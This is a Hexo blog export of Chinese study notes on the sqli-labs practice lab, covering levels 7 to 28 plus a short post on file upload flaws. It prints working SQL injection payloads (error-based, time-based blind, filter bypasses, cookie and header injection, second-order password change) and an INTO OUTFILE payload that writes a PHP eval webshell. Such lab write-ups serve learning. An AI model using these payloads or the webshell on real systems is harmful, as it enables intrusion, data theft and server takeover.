{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"sqlilabs6","slug":"sqlilabs6","date":"2020-11-27T16:56:50.000Z","updated":"2020-12-03T15:41:31.600Z","comments":true,"path":"2020/11/28/sqlilabs6/","link":"","permalink":"http://example.com/2020/11/28/sqlilabs6/","excerpt":"接下来是第二部分的21关其实感觉和第20关没有多大差别，我们看看源码吧 发现还是有点差别的 比如说： 有一个**$cookee = base64_decode($cookee);**好像是将cookee给编码解密了，说明前面肯定还有一个加密，我们用burp suit抓包试试","text":"接下来是第二部分的21关其实感觉和第20关没有多大差别，我们看看源码吧 发现还是有点差别的 比如说： 有一个**$cookee = base64_decode($cookee);**好像是将cookee给编码解密了，说明前面肯定还有一个加密，我们用burp suit抓包试试 果不其然 他的cookee被加密了 我们直接网页搜索解密软件 然后发现结果是 admin然后我们利用这里来注入一下 看下源代码 发现是’)单引号组合括号的 ，然后我直接输入’) and 1=1# 发现他报错了 \\Issue with your mysql: Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (utf8mb4_0900_ai_ci,COERCIBLE) for operation ‘=’**有点奇怪 我们再来看看源代码 可以发现这边这个使用的是encodebase64_encode是加密,而base64_decode是解密所以我们来思考一下他代码是如何运行的 他是这样的 如果账号密码正确 则保存你此时的cookies，并且加密发送，所以我再burp suit抓包的时候，抓到的用户名就是加密的，然后跳转到下一个页面，在这个页面中要利用cookies输出账号密码，所以他又解码输出了，而这个时候如果我们要利用burp suit修改cookies的数据达到注入的目的，我们就需要将我们的注入语句也进行加密，这样他解密以后才会被mysql识别并执行命令。OK 大概了解整个运转过程后，我们寻找注入点发现在下面 有个’）单引号加括号的注入点，然后我们在burp suit注入试试uname后面的那串东西是1’)and extractvalues(1,concat(‘‘,database(),’‘))# 经过base64位编码以后的结果 这个又是什么神仙报错？？？？ 但是我们可以看到有个security 我们数据库的名字的出现 但是为了避免不是偶然我们再试试看，我无语了 原来是我函数名输错了，应该是extractvalue 所以正确的界面应该是 OK 利用报错注入成功 第22关这一题和上一题又有点不一样，题目说是基于双引号的注入但我们从这个语句可以发现，他不是直接在select里面添加双引号 而定义一个$cookee1 并且这个cookee1=”$cookee”其实按照php的语法上面那个其实可以等价为下面那个，但是我不知道他为啥要这样操作？更安全吗？然后就直接把上一题的单引号和括号换成双引号就行，其他的没啥区别 23关23关 又回到了以前熟悉的界面 但是好像跟之前的有不太一样，因为加了单引号报错 加了双引号和and1=1 and1=2 却不报错 让我们再来研究一下源码这里介绍一个函数preg_replace替换函数preg_replace 函数执行一个正则表达式的搜索和替换。语法：preg_replace(要替换的东西，替换成啥东西，哪个里面的东西需要替换);知道这个以后我们不难发现，再上面这个代码中 我们的注释符需要替换。 那么注释符被替换我们该如何实现注入呢？我们要回归使用注释符的本质：没加注释符前后面的语句因为没有闭合所以会报错，所以我们加了注释符直接让其消失就好了，而现在没了注释符，我们就需要将语句闭合起来，使其不报错，叫做单引号闭合绕过这个其实之前遇到过 加了超级多引号，我看太麻烦就没去试，今天看来不得不试了！！！在之前更正的原理中，我们知道了闭合单引号的真相，所以这关现在就显得很简单了有个问题：为啥order by 在这里好像不管怎么放置都是错误的，这就很纳闷了？？因为单引号闭合后里面的数据变成字符串了，但是order by 需要的是数据payload：?id=-1’union select 1,database(),’3 这个时候数据库就出来了payload：?id=-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ or’1=1 第24关这关就和之前的很不一样了查阅资料后 知道一件事：SQL注入一般分为两类：一阶SQL注入（普通SQL注入），二阶SQL注入什么是二阶注入：1.构造带有注入语句的危险payload1数据，在http请求中提交到服务器当中，该数据会被服务器存储到数据库当中2.当我们要修改该payload1数据的时候，程序在检索存储payload1的数据库的时候将会造成SQL注入，如果攻击成功，在第二次响应中返回结果3.也称为存储型注入，将可能造成sql注入的语句存储到数据库中，当再次调用该数据的时候，就可能发生SQL注入。先来看看源码先从index.php看起：一开始就是一个session_start()函数seession：https://blog.csdn.net/zhengxijia2012/article/details/73437376谈谈我的理解，为什么我们一开始cookies可以在多个页面保存使用，就是因为有这个session函数发挥作用然后在其他源码中，我们不难发现，基本上每个数据都有过滤操作，但是我发现 在pass_change的时候，他的username是没有过滤操作的如上，在下面的update语句中 username是直接从数据库被调用的，这就意味着我们可能可以通过这个数据进行注入（二阶注入），如果我们要利用这点，也就是说我们必须有数据是带有危险字符的存储在数据库当中，那么接下来，我们需要在数据库中构建这样一个数据，从上面的代码中我们发现他的username是用单引号闭合的，所以我们需要构建一个单引号注入的数据——admin’# ，这里有个问题：不是被转义了吗，为啥在数据中还会以单引号的形式存在，这是因为转义只是暂时的，存储以后还是以单引号的形式存在的 接下来我们研究一下 为啥可以更改 原SQL语句： UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' 修改密码的SQL语句： update users set password='$pass' where username='$username' and password='$curr_pass' 最后真正执行的sql语句： update users set password=='$pass' where username='admin' 但是这个具有一定的局限性，就是说，我们只能修改特定的用户的密码，比如说我想修改上表中的dumb，那么我就得在创建一个dumb'#的数据存储在数据库当中。 接下来我们看看有没有其他攻击手法： **1报错注入：** ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20201201122617.png) 有错就die网页，so 报错注入不行2.延时注入有字符数限制，所以不行 第25关首先看一下源代码：发现定义了blacklist()函数作用如下，就是过滤掉 or 和and，那么我们该如何绕过呢？看到这个我们就知道是单引号注入，接下来我试着构建payload试试从那个preg_replace函数中我们可以看出，他是将or转义成啥都没有，所以有一种思路是，在and里面插入and 转义完后即可留下我们本来的语句所以payload 12?id&#x3D;1&#39;aandnd 1&#x3D;2 --+?id&#x3D;1&#39;oorrder by 3 --+ OK 绕过成功 然后我们只需要用order by 查询字符段数目，然后union拼接一下语句即可绕过。 这里出现了一个$hint=$id; 然后最后又return了一个i$id，所以我们可以知道,$hint是用来储存存放数据的，作用是更方便，不过这也让我们知道我们输入的语句到程序里面会变成啥样的。 其他绕过方法绕过思路：（1）大小写变形 Or,OR,oR（2）编码，hex，urlencode（3）添加注释/or/（4）利用符号 and=&amp;&amp; or=||（5）双写绕过https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control 这个是关于绕过的以及CTF题目的一篇文章，感觉还挺厉害 我又没保存博客人傻了——-第25关a和25关没多大区别 26关先研究一下源代码 首先是一个新函数fopen()函数fopen()函数用于打开文件文件或者URL，语法:fopen(filename,mode,include_path,context)而在这个里面的意思是 打开那个txt然后写入数据。我们接着往下看 在这关当中，他过滤了很多东西 我们依次来看看吧，分别是： 三种注释符，空格，还有反斜杠，还有and，or（这里要特别注意information里面有个or所以也会被过滤， 所以在注入的时候记得注意也要双写）好了 接下来我们开始试着绕过：1.因为空格被过滤了，所以我们可以采取是用括号的方式绕过这个过滤2.由于注释符过滤，除了用一些特殊的字符代表注释符，我们这里先采用闭合单引号的方式绕过，那么我们知道，单引号内的内容会被转变成字符串，所以有用到数字的方法在这里都行不通，使用union拼接语句的时候，可以获取到数据库，但是再往下由于要使用limit所以也不行了，所以这里我们采取报错注入的方式：构建payload：//?id=1’aandnd(extractvalue(1,concat(‘‘,database(),’‘)))aandnd’1’=’1////?id=1’aandnd(extractvalue(1,concat(‘‘,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=’security’),’‘)))aandnd’1’=’1// 第26a关这关和26关没有多大区别，唯一区别是这里需要采取单引号+括号的形式来注入还是有其他区别的，比如在这关当中，他是不输出报错信息的，并且因为是采取单引号+括号闭合方式进行注入的，如果我们想要时间盲注的方式，也不太行因为闭合以后，单引号加括号里面的内容就会变成字符，跟之前用不了order by是一个意思。查了一下好像确实只能用%a0进行绕过了，然后接下来需要安装一下虚拟机 第27关这关过滤的是这关过滤的有如下内容，但是我们可以发现，这次没有过滤and但是过滤了select和union还有注释符那些然后我们可以发现，这一次的正则表达式和前面几个又有点不太一样，反斜杠后面又多了一些字母作用如下： 资料来源：[https://www.baidu.com/s?rsv_op=c2KYgWdLVYcV2R3VPVh1WafSTX6XL0b2NMNbgbbP5faVPMWOgMNVVPSOQOU9XXcQghM678gVQZ9QeQaJYeYWeIR0335XMNab436TIP42cPUMd06IThM4hLJa&amp;wd=fopen%E5%87%BD%E6%95%B0&amp;ie=utf-8&amp;tn=49055317_3_hao_pg] https://blog.csdn.net/onthewaygun/article/details/10009021?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-1.control根据以上资料 我们可以知道，这次的正则表达式替换的更加牛，他是一直在替换，就是说不能双鞋，因为你双写完以后替换过一遍，待会还会再替换一次，所以这里我们只能采用大小写混搭的方式进行注入//刚刚居然崩溃了–导致没保存。。成年人的崩溃就在一瞬间。。。。。。// 那我们接下来构建payload：?id=1’and(extractvalue(1,concat(‘‘,database(),’‘)))and’1=1?id=1’and(extractvalue(1,concat(‘‘,(seLeCt(group_concat(table_name))from(table_schema))=’security’),’‘)))and’1=1 下面也是这样的一套组合拳，其实我发现，我们可以利用报错注入的原因是在报错注入的时候我们可以将所有数据一起报错出来（group_concat）函数，但是当只能使用时间盲注的时候就没办法了，因为都是需要数字说明截取。这里有个问题，为什么在下面的查询语句中or无法报错，但是and可以报错 27a关因为无报错信息所以只好采取时间盲注或者union select联合注入，然后就需要用到特殊转义字符。。开始搭linux系统 第28关 感觉还是需要使用linux系统进行操作会比较方便一些，用括号的方式进行闭合太累了28a关也和这个差不多 小结一下：1.最近做的都是被过滤的题目，要如何绕过过滤方法也就是这几种似乎也没啥好说的了–2.然后源代码的学习挺有用的，感觉看源代码对于整个过程会更了解一些，然后注入的过程也更有感触了。","categories":[],"tags":[]},{"title":"sqlilabs5","slug":"sqlilabs5","date":"2020-11-20T11:20:26.000Z","updated":"2020-11-27T16:55:09.289Z","comments":true,"path":"2020/11/20/sqlilabs5/","link":"","permalink":"http://example.com/2020/11/20/sqlilabs5/","excerpt":"第十七关这一关和其他的就不太一样，比如说标题是update query所以这里 我们需要修改表中的数据修改表中数据我们使用的是 update语法是：update test set sex=female;//所有员工性别更改为女性update test set sex = female where name =’zhangsan’;//更改张三这个员工的性别","text":"第十七关这一关和其他的就不太一样，比如说标题是update query所以这里 我们需要修改表中的数据修改表中数据我们使用的是 update语法是：update test set sex=female;//所有员工性别更改为女性update test set sex = female where name =’zhangsan’;//更改张三这个员工的性别 看了下这题的是这样的 当我在username里面随便输了admin 他就说我成功的更改了我的密码，再结合源码，猜测这里是 在我输入账号以后，他会连接到存放我这个账号的字符段，然后将那边的密码更换成我现在输的 然后，在username无论我输那个单引号的何种组合情况，都没有反应，结合源码，我发现这里有个PHP的安全命令 **addslashes()与stripslashes()函数** 这边自定义了一个函数 check_input函数，里面出现了substr、get_magic_quotes_gpc、stripslashes这几个函数： get_magic_quotes_gpc()函数get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开当magic_quotes_gpc打开时，所有的’(单引号)、”(双引号)、(反斜杠)和NULL(空字符)会自动转为含有反斜杠的溢出字符。所以我们在账号一栏输入的单引号等的数据没有效果的原因就在这里 addslashes()与stripslashes()函数addslashes(string)函数返回在预定义字符之前添加反斜杠\\的字符串： 单引号 ’ 双引号 “ 反斜杠 \\ 空字符 NULL 该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。 注意：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。stripslashes(string)函数删除由addslashes()函数添加的反斜杠。 substr函数substr(string,start[,length])参数 描述string 必需，规定要返回其中一部分的字符串start 必需，规定在字符串的何处开始正数：在字符串的指定位置开始负数：在从字符串结尾开始的指定位置开始0：在字符串中的第一个字符处开始length 可选，要返回的字符数。如果省略，则返回剩余文本正数：从start参数所在的位置返回的长度负数：从字符串末端返回的长度这里补充一下我的理解：这个substr的意思是截取字符段，也就是截取你输入的数据前几位这样，然后将截取的数据进行过滤操作，即加入反斜杠操作 ctype_digit()函数ctype_digit(string)函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。 mysql_real_escape_string()函数mysql_real_escape_string(string,connection)参数 描述string 必需，规定要转义的字符串connection 可选，规定MySQL连接。如果未规定，则使用上一个连接 mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符： \\x00 \\n \\r \\ ’ “ \\x1a**知道这个点后 ，那就说明我们无法通过在账号一栏注入 ** 然后我们看这个密码这一栏有个引号，所以我们这就意味着我们可以在密码一栏通过密码来注入我们在账号一栏输入admin以后，接着在密码一栏输入我们的注入语句 1admin&#39;and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),1) -- 1123&#39;and updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),&#39;~&#39;),1) -- 那么我们如何绕过这个过滤呢？https://blog.csdn.net/qq_42181428/article/details/105061424?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-3.control 这个博客里面倒是说了个方法，但是用在这里好像不太合适，因为其实我们注意到他有一个substr函数，只截取了前15个字符，所以当我输入的语句超过15个的时候，后面的代码就自动被抛弃了。记得拓展学习SqlParameter 第 十八关这个关卡好像有点不太一样，先来看看源码： ![E_{358QK8A23J%N`T0Q%2LM](https://raw.githubusercontent.com/Hwwg/myphoto/master/20201126202559.png) 可以看到在这一关，对于uname和passwd依旧做了addslashes()函数处理，所以想再这里注入不太可能 并且在输出uname和passwd的时候也没有单引号等字符的出现，所以想在这里注入是不可能的了 看这里 获取了uagent和IP 这个是干啥的？ HTTP_USER_AGENT：返回HTTP头部的USER_AGENT（user_agent的内容包含发出请求的用户信息）REMOTE_ADDR:：返回http头部IP地址接下来我们再来看看这些源代码 到底哪里可以让我们注入找到了一个insert语句 这里发现 后面有个引号，要是我们在里面输入我们的命令，是不是就可以获得我们需要的信息了？那我们该如何更改呢——burp suit 抓包工具，因为 我们从前面的$servent可以看出 这里是需要返回http头部的信息，所以。。。。懂的都懂试一下： 猜猜我发现了啥，这有个user_agent，OK 让我们吧大致思路理顺一下：一开始我们需要返回http发出请求的用户信息，如果我们将这个用户信息更改完我们的指令，那其实就是这样的$uagent=$servent[‘这里就是我们的注入语句’]然后这个查询语句会被代入到sql中执行，我们尝试一下将user-Agent替换成以下语句现在user-Agent这个语句的最后添加一个单引号，看看是否报错结果是会报错的，所以我们可以直接在burp suit里面添加我们的注入语句 1&#39;or extractvalue(1,concat(&#39;~&#39;,database(),&#39;~&#39;)),1,1) # 这里说说我的思路：因为我们前面知道，这个注入点是在insert语句当中的，我一开始没输入后面的，1,1导致出现错误提示：就是和insert前面插入值不对应的情况，他insert插入了三个值，所以我们这里也需要有三个值 然后#号注释掉后面的内容，然后至于后面的1加不加引号都无所谓，因为1无论加不加引号都是合法数据，但是 如果要加引号 一定要严格按照insert语句的格式 比如1 左右两边就要加 不然就会报错： 12&#39;or extractvalue(1,concat(&#39;~&#39;,database(),&#39;~&#39;)),&#39;1&#39;,&#39;1&#39;) # &#39;or extractvalue(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),&#39;~&#39;)),1,1) # 接下来就是爆表 爆字符段了让我们愉快的进入19关吧这关和18关差不多就是注入的位置现在在Referer 第20关这里我们先看看源码吧依旧做了过滤操作，所以不能在账号密码这里操作我们发现他和前几关不一样的时候这里又获取了一个cookie数据 什么是cookie？Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息cookie是什么?有什么作用?cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页;而且，你自动保存的内容也是被记录在cookie当中的，当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告 感觉这个就有点危险呀，好像可以利用cookies做点什么不得了的东西？？？ 我们继续往下看 有点熟悉，我们好像可以利用这个cookee试试，这个时候我们依旧使用burp suit抓个包 第一次没看到cookie的数据 我们再点一次forward 这一次就有了 接下来让我们试试加个引号 出现了报错，然后我们再试试and 1=1 和and 1=2 不一样，报错了 ，所以这里存在注入点 接下来就是常规操作了 我们应该是要利用报错注入成功 代码是 1&#39; and extractvalue(1,concat(&#39;~&#39;,database(),&#39;~&#39;)) # 这里 我就在想为什么我要要按两次forward才能截取到含有cooKies的包呢？让我们回去看看源代码学到这里 有必要先总结一下几个常见函数，之前只是模模糊糊的概念：1.mysqli_query() 函数执行某个针对数据库的查询。2.mysqli_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有。（取出我们输入的那一行账号密码）3.setcookie() 函数向客户端发送一个 HTTP cookie。cookie 是由服务器发送到浏览器的变量。cookie 通常是服务器嵌入到用户计算机中的小文本文件。每当计算机通过浏览器请求一个页面，就会发送这个 cookie。cookie 的名称指定为相同名称的变量。例如，如果被发送的 cookie 名为 “name”，会自动创建名为 $user 的变量，包含 cookie 的值。必须在任何其他输出发送前对 cookie 进行赋值。如果成功，则该函数返回 true，否则返回 false。 1setcookie(name,value,expire,path,domain,secure) header（）跳转函数header(“Location:”)作为php的转向语句，接下来就跳转打开新页面，并且如果后面没有紧跟exit的话 他是会继续执行的只不过不会返回到页面上，要求header前没有任何输出。这就是为什么我们要连续按两次forward的原因了。接下来的语句好像也没啥其实在这一关中还可以使用union拼接select语句从这个途中我们不难发现 其实username password都是从cookee中获取的，然后我们之前也知道cookee那里存在注入点想要让我们需要的数据直接在username和paswrd这里输出，接下来我们就可以order by 然后 union select 拼接语句查询了，思路就跟之前的一样。 第21关不知道为啥我21关和22关是没有的但是我看了一下题目，是上传文件的题目 然后查了一下 果然还是要一句话木马，然后需要利用burp suit","categories":[],"tags":[]},{"title":"sqlilabs4","slug":"sqlilabs4","date":"2020-11-19T11:10:25.000Z","updated":"2020-11-20T11:19:45.531Z","comments":true,"path":"2020/11/19/sqlilabs4/","link":"","permalink":"http://example.com/2020/11/19/sqlilabs4/","excerpt":"第十一关这里开始进入post注入，首先我们需要知道，post是向服务器提交数据 一开始是从需要从这里输入账号密码做完之前的题目 其实就有感觉就是，你输入的东西、比如id、password之类的 最后都会转换成sql语言并发挥作用，在第一关中，我们使用了单引号，并且截图进行分析，而在这一关我们也是如此","text":"第十一关这里开始进入post注入，首先我们需要知道，post是向服务器提交数据 一开始是从需要从这里输入账号密码做完之前的题目 其实就有感觉就是，你输入的东西、比如id、password之类的 最后都会转换成sql语言并发挥作用，在第一关中，我们使用了单引号，并且截图进行分析，而在这一关我们也是如此 在这个当中，我看出 我们的语句好像可以跟之前一样，在1后面的''这两个引号里面似乎可以注入我们想要的命令但其实不行 输出的确实这样一个语句，这个时候就很奇怪了，为什么单引号里面的内容不会被执行呢？ 我们再来对比一下他和第一关的源码 我吐了啊 其实有个很关键的点是，现在我们在这里输入 –+注释功能，其实已经是不起作用的了所以上面为什么不会执行就是因为这个这个原因 ！！！！！！！！！所以这里我们只需要输入–(空格), 或者# 即可注释掉后面的语句 这样就可以了 我的天哪，我对自己太无语了 这里整理一下注释的知识点注释手段1mysql的注释有4 种 ： “#” ： # 开头到行尾的都为注释，只能注释一行 “– ” （2个减号 一个空格） ： – 开头到行尾都为注释 ， 只能注释一行 “/* xxx /“ : 可以注释多行，但是一定要闭合，不然出错 ”/! 数字 代码 */“ : 可以跨行注释，但是一定要闭合，不然出错。2在浏览器url中，#是用来知道浏览器动作（例如锚点），对服务器端没有效果。可以用 # 的url编码 即%23代替。在浏览器中，url中的+解析为空格。在myslq中，–’ 是的 – 与 单引号 连接在一起，不能形成正确的sql语句，而 –空格 则可以。所以在浏览器的url中用 –+ 或–’使服务端能够正确注释sql语句所以 +针对的是在url中的注释！！！ 老规矩 order by 查字段数 字段数是2 所以 接下的操作就很明确了 接下来就是巩固一下代码的记忆了 接下来是第12关第十二关 我们 无论输入单引号还是括号都无反应，都没有报错，所以我直接输入了双引号，出现这个报错，所以很明显 我们需要双引号加括号来闭合后面语句，并在其中注入我们的查询语句 第十三关这个关卡其实就是需要盲注了，因为登录成功以后，他是没有登录信息的 接下来就是先布尔盲注 那就是看有无报错这里我在使用burp suit暴力破解试试发现那个密码字典里面没有emails这个名字，所以就没成功，我觉得可以去找一些字典过来。 然后这里引入一个新函数updatexml:作用：改变文档中符合条件的节点的值，需要注意的是 ，我们在注入中使用这个语句是加了select的，所以并没有对真正的数据进行修改，而是在内存中将取出的数据进行修改然后返回给用户注意：这个这个函数是针对xml文件进行修改的，然后我们数据库的内容基本上是存放在这个xml文件中的语法：updatexml(xml_document,xpath_string,new_value)第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)第三个参数：new_value，String格式，替换查找到的符合条件的数据 实例select updatexml(1,concat(‘‘,(SELECT database()),’‘),1) – 结果是看报错 是XPATH报错，并且 输出的报错信息，是我们那个concat拼接部分的内容。 使用理解：对于这个函数，我想了一下，大概是这样的，updatexml是一个修改函数，他的语法是UPDATEXML (XML_document, XPath_string, new_value); 我们知道中间那个XPath_string是需要符合xpath格式的，所以当我们注入的格式不符合xpath他就会报错，而updatexml（）报错信息是特殊字符、字母以及之后的内容，为了前面后面字母丢失，开头结尾连接特殊字符~， 这样就只有中间我们的查询语句是以结果的形式报出，而且报错的内容是将我们的语句转化过后的后面我又将‘’里面的内容替换了一下，都是会原样输出的，但是如果是字母 则会表现无错，说明这个是合法的，那下次在使用这个语句注入的时候干脆都用字符吧， 第十四关我们就使用extractvalue（）这个函数试试作用：对XML文档进行查询的函数格式extractvalue(xml.frag,xpath_expr)共同点和updatexml的共同点是报错原理：Xpath格式语法书写错误的话，就会报错并且报错的内容也是引号内的，如果是命令则会直接转化直接上操作： 使用 extractvalue(1,concat(‘‘,(select database()),’‘)) – 接下来就大同小异了。 小结：其实我们使用的这两个函数，都是利用他的报错会将我们的命令语句识别，并输出我们需要的信息。 第15关这一关没有输出报错信息，所以我们输入 ‘and1=1 – 和’and1=2 – 发现结果其实是不一样的，所以我们可以知道单引号注入。没有报错信息，意味着我们需要时间盲注：admin’ and if(substr(database(),1,1)=’s’,sleep(5),1) – 和之前的也没多大区别哈哈 第十六关是双引号加括号的 小结一下：到现在为止遇到的注入点好像就是只有or 1=1–+ 1.’and 1=1–+ 2.”and 1=1–+ 3.)and 1=1–+ 4.’)and 1=1–+ 5.”) and 1=1–+ 6.”))and 1=1–+ 关于闭合问题的链接https://blog.csdn.net/qq_36896220/article/details/94129125 补充知识：在看源码的时候注意到有一个isset()函数作用用于检测变量是否已设置并且非NULL","categories":[],"tags":[]},{"title":"文件上传注入","slug":"文件上传注入","date":"2020-11-17T03:13:46.000Z","updated":"2020-11-19T10:57:51.569Z","comments":true,"path":"2020/11/17/文件上传注入/","link":"","permalink":"http://example.com/2020/11/17/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5/","excerpt":"","text":"感觉文件上传注入可以整理一下，毕竟和木马有关呢 文件上传1为什么文件上传存在漏洞上传文件时如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。https://blog.csdn.net/qq_36119192/article/details/84593150上面这个是关于那几个后缀的文件的说明 2.危害恶意的脚本文件，又被称为webshell，webshell脚本称为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等","categories":[],"tags":[]},{"title":"sqlilabs 3","slug":"sqlilabs-3","date":"2020-11-16T05:25:03.000Z","updated":"2020-12-02T12:10:49.784Z","comments":true,"path":"2020/11/16/sqlilabs-3/","link":"","permalink":"http://example.com/2020/11/16/sqlilabs-3/","excerpt":"LESS-7 在这题当中，我们不难发现，这次他是对((‘$id’))做了这个处理，所以我们只需要在后面多加一个’))这个 然后在里面添加我们需要注入的语句就可以进行注入了 好了 成功执行，接下来我们输入我们的查询语句试试","text":"LESS-7 在这题当中，我们不难发现，这次他是对((‘$id’))做了这个处理，所以我们只需要在后面多加一个’))这个 然后在里面添加我们需要注入的语句就可以进行注入了 好了 成功执行，接下来我们输入我们的查询语句试试 因为之前都知道他的数据库名字是security 所以我直接用substr查了，然后如果换成其他的他就会报错，好像接下来也没啥太大区别了？ OK 一模一样，但是我看外面那个标题 和其他的也不一样啊， 是叫做DUMP into outfile 即利用文件导入的方式进行注入（文件上传注入）原来这么快就要使用webshall 了：安装好webshall以后，https://blog.csdn.net/qq_34965596/article/details/104076019?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-7.add_param_isCf这个是webshall的简单使用教程 我们开始使用这个文件导入的方式进行注入：基础知识：1.如果服务端代码卫队客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）危害：非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为webshell，也可将webshell脚本成为一种网页后门，webshell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等。今天就先简单的使用一下select into outfile 直接写入1.利用条件（1）对web目录需要有写权限能够使用单引号（root）（2）知道网站绝对路径（这次由于网站直接搭载在本机下，所以可以很容易得知）（3）secure_file_priv 没有具体值2.查看secure_file_priv值secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限。当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权我发现我的secure_file_priv是有值的 所以我就找到ini配置文件https://blog.csdn.net/believe_today/article/details/79223684 这个是查找教程 然后将那个数值删掉 记得重启mysql，不然没用接下来就是使用 1union select 1,2 ,&quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &#39;D:\\\\apache\\\\www\\\\sqli-labs-php7-master\\\\Less-7\\\\123.php&#39; --+ 有个需要注意的点1这边的斜杠是两个。在输入这段代码以后 出现了这两个即使报错了 文件依旧生成了接下来就是利用菜刀工具，连接这个木马，控制文件 配置是这样的 这个连接密码是那个php一句病毒的post里面的字符 点击添加即可（PS:我一直按测试连接，一直说返回值为空，我人傻了） 然后添加完以后，右键那个 点击文件管理 OK 打开新世界的大门 这里需要补充一下，接下来回到刚才添加地址的那个页面右键单击我们添加的地址，然后按数据管理，然后点击数据库，输入这些信息，记得！！！！数据库类型是mysqli（分版本的）ok好了 数据库 一览无遗 攻击成功 补充知识：1.PHP一句木马是这样的 eval()：eval函数将接受的字符串当做代码执行参数情况： （1）如果参数是一个表达式，eval() 函数将执行表达式； （2） 如果参数是Javascript语句，eval()将执行 Javascript 语句；注意：（如果执行结果是一个值就返回，不是就返回undefined，如果参数不是一 个字符串，则直接返回该参数）语法：eval(string)案例：eval(“var a=1”);//声明一个变量a并赋值1。eval(“2+3”);//执行加运算，并返回运算值。eval(“mytest()”);//执行mytest()函数。函数作用域：eval()函数并不会创建一个新的作用域，并且它的作用域就是它所在的作用域，有时候需要将eval()函数的作用域设置为全局，当然可以将eval()在全局作用域中使用，这个时候可以用window.eval()的方式实现。 1234&lt;?php @eval($_POST[&#x27;hacker&#x27;]);?&gt; //解析一下这句话：hacker是密码，通过post提交数据，$_POST是超全局变量//@符号的意思是不报错//在写语句的时候注意 ?&lt;php 这三个之间无空格 //密码有无引号问题不大 将这个一句话木马写入文件上传到网站，然后打开这个这个函数好像还有其他东西没被我想到，有点怪怪的？？？ 感觉没这么简单 所以重新开了个博客整理这个文件上传注入的知识 2.webshellweb 应用管理工具，正常情况下，运维人员可以通过 webshell 针对 web 服务器进行日常的运维管理以及系统上线更新等，那么攻击者也可以通过 webshell 来管理 web 应用服务器。 法2也可直接将数据库的数据存到文档中 LESS-8在这个当中我们 发现他是没有报错信息的 那么我们就无法使用类似之前的报错注入了。所以就需要时间注入攻击这里我们就需要先了解一个sleep（）函数它的功能是可以让mysql的执行时间变长一班和if（expr1，expr2，expr3）结合使用，此if语句含义是：如果expr1是true 则if（）的返回是expr2，否则则返回的值为expr3。所以这里我们输入 1if（length(database()&gt;1),sleep(5),1) 这个语句的意思就是，如果数据库名称的长度大于1,那么延迟五秒钟响应，反之查询1那么我们怎么知道他的响应时间呢火狐浏览器 然后按网络即可 那接下来就是查询表的名字 1and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1 ),1,1) &#x3D; &#39;e&#39;,sleep(5),1) --+ 接下来的步骤都很相似了 第九关这个关和第八关还挺像的，但是这关连报错都没有，都是you are in 那这个时候 很明显就只能利用时间来判断是否注入了 因为不管是 and 1=1 还是 and1=2 画面都不会有变化，因为报错语句已经全部变成you are in了 一样的代码一样的测试结果，后面就不再截图了 用就是最后查询字段内容了 第十关根据标题 double 